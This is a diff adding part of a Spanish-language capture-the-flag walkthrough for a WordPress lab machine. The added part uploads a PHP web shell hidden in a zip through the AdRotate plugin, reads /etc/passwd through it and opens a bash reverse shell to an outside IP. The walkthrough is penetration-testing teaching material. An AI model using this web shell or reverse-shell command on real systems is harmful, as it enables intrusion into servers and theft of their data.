@@ -188,3 +188,33 @@ Pero no funciona, porque no hay manera de encontrar las páginas donde setear es
 También podemos intentar instalar algún plugin vulnerable a php pero no podemos instalar plugins porque no tenemos privilegios para ello a pesar de ser admnistradores del sitio web de wordpress.
 ![cannot_install_pluggins.png](cannot_install_pluggins.png)
 
+Observando la página del plugin instalado AdRotate, vemos que podemos añadir ficheros de medios.
+Entre ellos hay posibilidad de subir ficheros .zip que, según se describe, son descomprimidos automáticamente.
+Esto nos permitiría comprimir un fichero php y subirlo camuflado dentro del fichero zip.
+
+Este es el contenido del fichero ```rec.php``` que subiremos dentro del zip:
+
+´´´php
+<?php system($_GET['c']); ?>
+´´´
+
+Tras subirlo pasamos a realizar un reconocimiento para ver si se ha subido correctamente.
+![rce-php.png](rce-php.png)
+
+Ahora podríamos examinar el contenido de ficheros clave dentro del sistema de archivos de la máquina víctima. Podríamos hacer
+
+bash```
+http://loly.lc/wordpress/wp-content/banners/rce.php?c=cat%20/etc/passwd 
+```
+o
+bash```
+http://loly.lc/wordpress/wp-content/banners/rce.php?c=ls%20-la%20/home/loly
+``` 
+
+Sin embargo, para trabajar más cómodamente vamos a entablar una reverse shell utilizando el sigui9ente comando como parámetro en la URL:
+
+
+bash```
+bash -c "/bin/bash -i 2&> /dev/tcp/192.196.1.80/443 <0"
+``` 
+
